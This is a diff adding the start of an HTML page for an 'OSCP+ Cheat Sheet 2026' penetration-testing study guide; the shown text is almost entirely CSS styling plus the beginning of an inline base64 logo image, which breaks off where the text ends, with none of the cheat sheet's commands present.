@@ -1,0 +1,1718 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP+ Cheat Sheet 2026 — PEN-200</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:     #030308;
+  --bg2:    #07070f;
+  --bg3:    #0c0c1a;
+  --bg4:    #101020;
+  --neon-c: #00f5ff;
+  --neon-g: #00ff88;
+  --neon-p: #bf00ff;
+  --neon-r: #ff003c;
+  --neon-y: #ffee00;
+  --neon-o: #ff6600;
+  --text:   #d0d8e8;
+  --text2:  #8090b0;
+  --border: #1a1a35;
+  --border2:#252550;
+  --mono:   'Share Tech Mono', monospace;
+  --head:   'Orbitron', monospace;
+  --body:   'Exo 2', sans-serif;
+  --glow-c: 0 0 12px #00f5ff66, 0 0 30px #00f5ff22;
+  --glow-g: 0 0 12px #00ff8866, 0 0 30px #00ff8822;
+  --glow-p: 0 0 12px #bf00ff66, 0 0 30px #bf00ff22;
+  --glow-r: 0 0 12px #ff003c66;
+  --glow-y: 0 0 12px #ffee0066;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--body);
+  font-size: 12.5px;
+  line-height: 1.55;
+  overflow-x: hidden;
+}
+
+/* ── SCANLINES ── */
+body::after {
+  content:''; position:fixed; inset:0; z-index:9999; pointer-events:none;
+  background: repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.06) 3px,rgba(0,0,0,0.06) 4px);
+}
+
+/* ── HERO HEADER ── */
+.hero {
+  position: relative;
+  background: linear-gradient(135deg, #03030a 0%, #060614 40%, #08041a 70%, #030308 100%);
+  border-bottom: 2px solid var(--neon-c);
+  box-shadow: 0 4px 40px #00f5ff22;
+  padding: 40px 40px 32px;
+  text-align: center;
+  overflow: hidden;
+}
+.hero::before {
+  content:'';position:absolute;inset:0;
+  background: radial-gradient(ellipse 80% 60% at 50% 0%, #00f5ff08 0%, transparent 70%),
+              radial-gradient(ellipse 40% 40% at 10% 50%, #bf00ff06 0%, transparent 60%),
+              radial-gradient(ellipse 40% 40% at 90% 50%, #00ff8806 0%, transparent 60%);
+}
+.hero-grid {
+  position:absolute;inset:0;opacity:.07;
+  background-image: linear-gradient(var(--neon-c) 1px,transparent 1px),linear-gradient(90deg,var(--neon-c) 1px,transparent 1px);
+  background-size: 40px 40px;
+}
+
+/* OSCP Logo SVG area */
+.logo-wrap {
+  position: relative; display:inline-flex; align-items:center; gap:24px;
+  margin-bottom: 18px;
+}
+.oscp-logo-svg {
+  width: 72px; height: 72px;
+  filter: drop-shadow(0 0 16px #00f5ff99) drop-shadow(0 0 40px #00f5ff44);
+}
+.hero-titles { text-align:left; }
+.hero-brand {
+  font-family: var(--head);
+  font-size: 11px; letter-spacing: 4px;
+  color: var(--neon-c); text-transform: uppercase;
+  text-shadow: var(--glow-c);
+  margin-bottom: 4px;
+}
+.hero-h1 {
+  font-family: var(--head);
+  font-size: 38px; font-weight: 900;
+  color: #fff;
+  text-shadow: 0 0 20px #00f5ffaa, 0 0 60px #00f5ff44;
+  line-height: 1;
+  letter-spacing: 2px;
+}
+.hero-h1 span { color: var(--neon-c); }
+.hero-sub {
+  font-family: var(--head);
+  font-size: 13px; letter-spacing: 3px;
+  color: var(--neon-g);
+  text-shadow: var(--glow-g);
+  margin-top: 6px;
+}
+
+.hero-meta {
+  position: relative;
+  display: flex; justify-content: center; flex-wrap: wrap; gap: 12px;
+  margin-top: 24px;
+}
+.hero-pill {
+  background: rgba(0,245,255,.07);
+  border: 1px solid var(--neon-c);
+  color: var(--neon-c);
+  font-family: var(--mono);
+  font-size: 10px; letter-spacing: 1.5px;
+  padding: 5px 14px; border-radius: 2px;
+  text-shadow: var(--glow-c);
+  box-shadow: var(--glow-c);
+}
+.hero-pill.grn { border-color:var(--neon-g);color:var(--neon-g);background:rgba(0,255,136,.06);box-shadow:var(--glow-g);text-shadow:var(--glow-g); }
+.hero-pill.pur { border-color:var(--neon-p);color:var(--neon-p);background:rgba(191,0,255,.06);box-shadow:var(--glow-p);text-shadow:var(--glow-p); }
+.hero-pill.red { border-color:var(--neon-r);color:var(--neon-r);background:rgba(255,0,60,.06);box-shadow:var(--glow-r); }
+.hero-pill.yel { border-color:var(--neon-y);color:var(--neon-y);background:rgba(255,238,0,.06);box-shadow:var(--glow-y); }
+
+/* ── NAV BAR ── */
+.navbar {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(3,3,12,.96);
+  border-bottom: 1px solid var(--border2);
+  backdrop-filter: blur(8px);
+  display: flex; flex-wrap: wrap; gap: 0;
+  padding: 0 20px;
+}
+.navbar a {
+  color: var(--text2); text-decoration: none;
+  font-family: var(--mono); font-size: 10px; letter-spacing: 1px;
+  padding: 10px 14px;
+  border-bottom: 2px solid transparent;
+  transition: all .15s; white-space: nowrap;
+}
+.navbar a:hover { color: var(--neon-c); border-bottom-color: var(--neon-c); }
+
+/* ── SCORE BANNER ── */
+.score-banner {
+  background: linear-gradient(135deg, #040410 0%, #060618 100%);
+  border-bottom: 1px solid var(--border2);
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+  gap: 0;
+}
+.score-cell {
+  padding: 14px 20px;
+  border-right: 1px solid var(--border);
+  border-bottom: 1px solid var(--border);
+  text-align: center;
+}
+.score-cell:last-child { border-right: none; }
+.sc-label { font-family:var(--mono); font-size:9px; letter-spacing:1.5px; color:var(--text2); text-transform:uppercase; margin-bottom:5px; }
+.sc-val { font-family:var(--head); font-size:18px; font-weight:700; }
+.sc-val.c { color:var(--neon-c); text-shadow:var(--glow-c); }
+.sc-val.g { color:var(--neon-g); text-shadow:var(--glow-g); }
+.sc-val.p { color:var(--neon-p); text-shadow:var(--glow-p); }
+.sc-val.r { color:var(--neon-r); text-shadow:var(--glow-r); }
+.sc-val.y { color:var(--neon-y); text-shadow:var(--glow-y); }
+
+/* ── MAIN LAYOUT ── */
+.page { max-width: 1400px; margin: 0 auto; padding: 32px 24px 60px; }
+
+/* ── SECTION ── */
+.section { margin-bottom: 48px; }
+.section-head {
+  display: flex; align-items: center; gap: 14px;
+  margin-bottom: 20px; padding-bottom: 10px;
+  border-bottom: 1px solid var(--border2);
+  position: relative;
+}
+.section-head::after {
+  content:''; position:absolute; bottom:-1px; left:0;
+  width: 120px; height: 1px;
+  background: var(--neon-c); box-shadow: var(--glow-c);
+}
+.section-num {
+  font-family: var(--head); font-size:11px; letter-spacing:2px;
+  color: var(--neon-c); background: rgba(0,245,255,.08);
+  border: 1px solid var(--neon-c); padding: 3px 10px;
+  box-shadow: var(--glow-c);
+}
+.section-title {
+  font-family: var(--head); font-size: 16px; font-weight:700;
+  color: #fff; letter-spacing: 1px;
+}
+.section-badge {
+  margin-left: auto; font-family:var(--mono); font-size:9px; letter-spacing:2px;
+  color: var(--neon-g); border:1px solid var(--neon-g); padding:2px 8px;
+  box-shadow: var(--glow-g);
+}
+
+/* ── GRID ── */
+.g2 { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+.g3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:14px; }
+.g4 { display:grid; grid-template-columns:repeat(4,1fr); gap:12px; }
+
+/* ── CARD ── */
+.card {
+  background: var(--bg2);
+  border: 1px solid var(--border2);
+  border-radius: 2px;
+  overflow: hidden;
+  margin-bottom: 14px;
+  transition: border-color .2s;
+}
+.card:hover { border-color: #2a2a55; }
+.card.c-cyan  { border-top: 2px solid var(--neon-c); }
+.card.c-green { border-top: 2px solid var(--neon-g); }
+.card.c-purple{ border-top: 2px solid var(--neon-p); }
+.card.c-red   { border-top: 2px solid var(--neon-r); }
+.card.c-yellow{ border-top: 2px solid var(--neon-y); }
+
+.card-h {
+  background: var(--bg3); border-bottom: 1px solid var(--border);
+  padding: 8px 14px;
+  font-family: var(--mono); font-size: 11px; font-weight:700;
+  display: flex; align-items: center; gap: 8px;
+}
+.card-h .ico { font-size:13px; }
+.card-h .title { color: var(--text); }
+.card-h .sub { margin-left:auto; font-size:9px; color:var(--text2); letter-spacing:1px; }
+.card-body { padding: 12px 14px; }
+
+/* ── TABLES ── */
+table { width:100%; border-collapse:collapse; font-size:11.5px; margin:6px 0; }
+th {
+  background: var(--bg4); color: var(--neon-c);
+  padding: 7px 10px; text-align:left;
+  font-family:var(--mono); font-size:9px; letter-spacing:1.5px;
+  border:1px solid var(--border2); text-transform:uppercase;
+}
+td {
+  padding: 6px 10px; border: 1px solid var(--border);
+  color: var(--text); vertical-align:top;
+}
+tr:hover td { background: rgba(0,245,255,.025); }
+
+/* ── CODE BLOCKS ── */
+.cb {
+  background: #020208;
+  border: 1px solid var(--border2);
+  border-left: 3px solid var(--neon-c);
+  border-radius: 2px;
+  padding: 10px 14px;
+  margin: 8px 0;
+  overflow-x: auto;
+  position: relative;
+  font-family: var(--mono);
+  font-size: 11.5px;
+  line-height: 1.6;
+}
+.cb:hover { border-color: #252550; border-left-color: var(--neon-c); }
+.cb pre { white-space: pre; }
+.cb .cp {
+  position:absolute; top:6px; right:8px;
+  background:var(--bg3); border:1px solid var(--border2);
+  color:var(--text2); font-size:9px; letter-spacing:1px;
+  padding:2px 7px; cursor:pointer; font-family:var(--mono);
+  border-radius:2px; transition:all .15s; opacity:0;
+}
+.cb:hover .cp { opacity:1; }
+.cb .cp:hover, .cb .cp.ok { color:var(--neon-g); border-color:var(--neon-g); }
+
+/* syntax */
+.gc { color:var(--neon-g); }   /* command/keyword */
+.cc { color:var(--neon-c); }   /* flag/option */
+.yc { color:var(--neon-y); }   /* argument */
+.pc { color:var(--neon-p); }   /* special */
+.rc { color:var(--neon-r); }   /* error/bad */
+.oc { color:var(--neon-o); }   /* string */
+.dc { color:var(--text2); font-style:italic; } /* comment */
+.wc { color:#80cbc4; }         /* variable */
+
+/* ── ALERT BOXES ── */
+.alert {
+  border-left: 3px solid; padding: 9px 14px; margin: 10px 0;
+  font-size: 12px; border-radius: 0 2px 2px 0;
+}
+.alert-c { border-color:var(--neon-c); background:rgba(0,245,255,.05); }
+.alert-g { border-color:var(--neon-g); background:rgba(0,255,136,.05); }
+.alert-r { border-color:var(--neon-r); background:rgba(255,0,60,.05); }
+.alert-y { border-color:var(--neon-y); background:rgba(255,238,0,.05); }
+.alert-p { border-color:var(--neon-p); background:rgba(191,0,255,.05); }
+.alert-label { font-family:var(--mono); font-size:9px; letter-spacing:2px; font-weight:700; margin-bottom:4px; }
+.alert-c .alert-label { color:var(--neon-c); }
+.alert-g .alert-label { color:var(--neon-g); }
+.alert-r .alert-label { color:var(--neon-r); }
+.alert-y .alert-label { color:var(--neon-y); }
+.alert-p .alert-label { color:var(--neon-p); }
+
+/* ── TAGS ── */
+.tag {
+  display:inline-block; padding:1px 7px; border-radius:2px;
+  font-family:var(--mono); font-size:9px; letter-spacing:.5px;
+  border:1px solid; margin:1px 2px;
+}
+.tg { color:var(--neon-g);border-color:var(--neon-g);background:rgba(0,255,136,.07); }
+.tc { color:var(--neon-c);border-color:var(--neon-c);background:rgba(0,245,255,.07); }
+.tp { color:var(--neon-p);border-color:var(--neon-p);background:rgba(191,0,255,.07); }
+.tr { color:var(--neon-r);border-color:var(--neon-r);background:rgba(255,0,60,.07); }
+.ty { color:var(--neon-y);border-color:var(--neon-y);background:rgba(255,238,0,.07); }
+
+/* ── LISTS ── */
+ul.dotlist { list-style:none; padding:0; }
+ul.dotlist li {
+  padding:3px 0 3px 16px; position:relative;
+  color:var(--text2); font-size:12px; border-bottom:1px solid rgba(255,255,255,.04);
+}
+ul.dotlist li:last-child { border-bottom:none; }
+ul.dotlist li::before {
+  content:'›'; position:absolute; left:0;
+  color:var(--neon-c); font-size:14px; line-height:1.4;
+}
+ul.dotlist li strong { color:var(--text); }
+ul.dotlist li code {
+  font-family:var(--mono); font-size:10.5px;
+  color:var(--neon-y); background:rgba(255,238,0,.06);
+  padding:0 4px; border-radius:2px;
+}
+
+/* ── PORTS GRID ── */
+.ports-grid {
+  display: grid; grid-template-columns: repeat(auto-fill, minmax(175px, 1fr)); gap: 6px;
+}
+.port-item {
+  background: var(--bg3); border: 1px solid var(--border);
+  padding: 6px 10px; font-family: var(--mono); font-size: 10.5px;
+  display: flex; align-items: center; gap: 8px;
+  transition: border-color .15s;
+}
+.port-item:hover { border-color: var(--neon-c); }
+.port-num { color: var(--neon-c); font-weight:700; min-width:52px; font-size:11px; }
+.port-name { color: var(--text2); font-size:10px; }
+
+/* ── SCORE BREAKDOWN ── */
+.score-breakdown {
+  background: var(--bg2); border: 1px solid var(--border2);
+  padding: 20px; margin-bottom:16px;
+}
+.sbd-row {
+  display:flex; align-items:center; gap:12px; margin-bottom:10px;
+}
+.sbd-label { width:200px; font-size:11.5px; color:var(--text2); flex-shrink:0; }
+.sbd-bar-wrap {
+  flex:1; height:20px; background:var(--bg4); border:1px solid var(--border);
+  border-radius:2px; overflow:hidden;
+}
+.sbd-bar {
+  height:100%; display:flex; align-items:center; padding-left:8px;
+  font-family:var(--mono); font-size:9px; font-weight:700; color:#fff;
+  transition: width 1.2s cubic-bezier(.4,0,.2,1);
+}
+.sbd-pts { width:45px; text-align:right; font-family:var(--mono); font-size:11px; }
+
+/* ── METHODOLOGY FLOW ── */
+.flow {
+  display:flex; flex-wrap:wrap; gap:0; margin: 10px 0;
+}
+.flow-step {
+  background: var(--bg3); border:1px solid var(--border2);
+  padding:10px 16px; flex:1; min-width:100px; text-align:center;
+  position:relative; font-size:11px;
+}
+.flow-step::after {
+  content:'▶'; position:absolute; right:-10px; top:50%; transform:translateY(-50%);
+  color:var(--neon-c); z-index:1; font-size:12px;
+}
+.flow-step:last-child::after { display:none; }
+.fs-num { font-family:var(--head); font-size:16px; font-weight:700; color:var(--neon-c); }
+.fs-txt { color:var(--text2); font-size:10px; margin-top:2px; }
+
+/* ── DIVIDER ── */
+.div { border:none; border-top:1px solid var(--border); margin:14px 0; }
+
+/* ── FOOTER ── */
+.footer {
+  background: var(--bg2); border-top: 1px solid var(--border2);
+  padding: 20px 40px; text-align:center;
+  font-family:var(--mono); font-size:10px; color:var(--text2);
+}
+.footer span { color:var(--neon-c); }
+
+/* ── RESPONSIVE ── */
+@media(max-width:1100px){ .g3{grid-template-columns:1fr 1fr;} .g4{grid-template-columns:1fr 1fr;} }
+@media(max-width:750px){ .g2,.g3,.g4{grid-template-columns:1fr;} .hero-h1{font-size:26px;} .logo-wrap{flex-direction:column;text-align:center;} .page{padding:16px 12px 40px;} }
+
+/* ── PRINT ── */
+@media print {
+  body::after { display:none; }
+  .navbar { display:none; }
+  .hero { padding:20px; }
+  .page { padding: 10px; }
+  .card { page-break-inside: avoid; }
+}
+
+.card.cc,.card.ccyan{border-top:2px solid var(--neon-c)}
+.card.cg,.card.cgreen{border-top:2px solid var(--neon-g)}
+.card.cp,.card.cpurple{border-top:2px solid var(--neon-p)}
+.card.cr,.card.cred{border-top:2px solid var(--neon-r)}
+.card.cy,.card.cyellow{border-top:2px solid var(--neon-y)}
+.card.co,.card.corange{border-top:2px solid var(--neon-o)}
+
+.sec{margin-bottom:48px}
+.sec-head{display:flex;align-items:center;gap:14px;margin-bottom:18px;padding-bottom:10px;border-bottom:1px solid var(--border2);position:relative}
+.sec-head::after{content:'';position:absolute;bottom:-1px;left:0;width:100px;height:1px;background:var(--neon-c);box-shadow:var(--glow-c)}
+.sec-num{font-family:var(--head);font-size:10px;letter-spacing:2px;color:var(--neon-c);background:rgba(0,245,255,.07);border:1px solid var(--neon-c);padding:3px 10px;box-shadow:var(--glow-c)}
+.sec-title{font-family:var(--head);font-size:15px;font-weight:700;color:#fff;letter-spacing:1px}
+.sec-badge{margin-left:auto;font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--neon-g);border:1px solid var(--neon-g);padding:2px 8px;box-shadow:var(--glow-g)}
+.cb0{padding:11px 13px}
+.ch{background:var(--bg3);border-bottom:1px solid var(--border);padding:7px 13px;font-family:var(--mono);font-size:11px;display:flex;align-items:center;gap:7px}
+.ch .t{color:var(--t,var(--text))}.ch .s{margin-left:auto;font-size:9px;color:var(--t2,var(--text2));letter-spacing:1px}
+
+</style>
+</head>
+<body>
+
+<!-- ══════════ HERO ══════════ -->
+<header class="hero">
+  <div class="hero-grid"></div>
+  <div class="logo-wrap" style="position:relative">
+    <!-- OSCP Logo SVG (official style recreation) -->
+    <img src="data:image/png;base64,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